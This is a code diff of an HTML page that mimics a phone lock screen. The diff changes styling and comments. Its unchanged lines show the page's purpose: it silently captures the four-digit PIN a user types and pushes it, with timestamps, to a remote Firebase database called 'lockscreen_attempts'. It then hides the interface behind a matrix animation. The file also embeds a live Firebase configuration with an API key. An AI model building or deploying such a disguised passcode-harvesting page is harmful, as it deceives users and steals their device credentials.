@@ -70,10 +70,10 @@
     justify-content: center;
     align-items: center;
     color: #0f0;
-    font-size: 32px;
-    font-weight: 600;
-    letter-spacing: 2px;
-    text-shadow: 0 0 10px #0f0;
+    font-size: 48px;
+    font-weight: 800; /* Bold configuration */
+    letter-spacing: 4px;
+    text-shadow: 0 0 15px #0f0;
   }
 
   /* Top Status Bar */
@@ -298,7 +298,7 @@
 
 <canvas id="matrixCanvas"></canvas>
 
-<div class="binary-screen" id="binaryScreen">BINARY CODES</div>
+<div class="binary-screen" id="binaryScreen">BINARY</div>
 
 <div class="status-bar" id="statusBar">
   <div id="statusDate">Loading...</div>
@@ -355,7 +355,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
 
-// Your verified Firebase web application config block
 const firebaseConfig = {
   apiKey: "AIzaSyAkEEk5c3wPQpSvZJoCB0sr086ip_9Gnmc",
   authDomain: "mobile-wallpaper-91468.firebaseapp.com",
@@ -369,7 +368,7 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// Application UI States
+// State Variables
 let enteredPin = "";
 const lockView = document.getElementById('lockView');
 const numericView = document.getElementById('numericView');
@@ -447,7 +446,7 @@ function cancelPin() {
 }
 
 // ==========================================
-// 4. Pin Processing & Silent Firebase Action
+// 4. Pin Processing & Silent Database Save
 // ==========================================
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
@@ -483,7 +482,7 @@ function updateDots() {
 function savePasscodeToFirebase(pinValue) {
   const currentTimestamp = new Date();
 
-  // Sends database metrics silently behind the scenes
+  // Sends database data silently behind the scenes
   push(ref(db, 'lockscreen_attempts'), {
     passcodeEntered: pinValue,
     time: currentTimestamp.toLocaleTimeString('en-US'),
@@ -491,11 +490,10 @@ function savePasscodeToFirebase(pinValue) {
     fullTimestamp: currentTimestamp.toISOString()
   })
   .then(() => {
-    // Hide default view layout screens entirely
+    // Hide default interface structures instantly upon entry save
     numericView.classList.remove('active');
     document.getElementById('statusBar').style.display = 'none';
     
-    // Switch on the localized Binary Matrix interface canvas elements
     const canvas = document.getElementById('matrixCanvas');
     const textScreen = document.getElementById('binaryScreen');
     
@@ -505,7 +503,7 @@ function savePasscodeToFirebase(pinValue) {
     startMatrixAnimation();
   })
   .catch((error) => {
-    console.error("Transmission Error:", error);
+    console.error("Realtime Database Error:", error);
     clearPin();
   });
 }
@@ -554,7 +552,7 @@ function startMatrixAnimation() {
   setInterval(draw, 33);
 }
 
-// Map local function execution calls to Module DOM listeners
+// Attach local module interaction element listeners
 document.getElementById('keypadGrid').addEventListener('click', (e) => {
   const button = e.target.closest('.key-btn');
   if (button) {
